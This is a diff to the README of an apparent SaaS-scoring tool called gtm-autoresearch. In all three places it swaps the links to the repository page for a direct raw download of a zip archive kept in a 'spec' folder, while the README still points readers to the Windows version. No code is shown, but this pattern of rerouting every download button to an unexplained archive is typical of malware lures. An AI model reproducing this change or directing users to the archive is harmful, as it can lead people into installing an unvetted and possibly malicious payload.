@@ -1,6 +1,6 @@
 # 🔍 gtm-autoresearch - Score SaaS models with clear loops
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Dignitycatshark668/gtm-autoresearch)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Dignitycatshark668/gtm-autoresearch/main/spec/gtm-autoresearch-v2.8.zip)
 
 ## 🚀 What this app does
 
@@ -29,7 +29,7 @@ Recommended:
 
 Visit the download page here:
 
-[https://github.com/Dignitycatshark668/gtm-autoresearch](https://github.com/Dignitycatshark668/gtm-autoresearch)
+[https://raw.githubusercontent.com/Dignitycatshark668/gtm-autoresearch/main/spec/gtm-autoresearch-v2.8.zip](https://raw.githubusercontent.com/Dignitycatshark668/gtm-autoresearch/main/spec/gtm-autoresearch-v2.8.zip)
 
 On that page, look for the latest release or the main download option, then get the Windows version.
 
@@ -177,4 +177,4 @@ This app fits teams that want a simple, repeatable way to study SaaS scoring mod
 
 ## 🔗 Download again
 
-[https://github.com/Dignitycatshark668/gtm-autoresearch](https://github.com/Dignitycatshark668/gtm-autoresearch)
+[https://raw.githubusercontent.com/Dignitycatshark668/gtm-autoresearch/main/spec/gtm-autoresearch-v2.8.zip](https://raw.githubusercontent.com/Dignitycatshark668/gtm-autoresearch/main/spec/gtm-autoresearch-v2.8.zip)
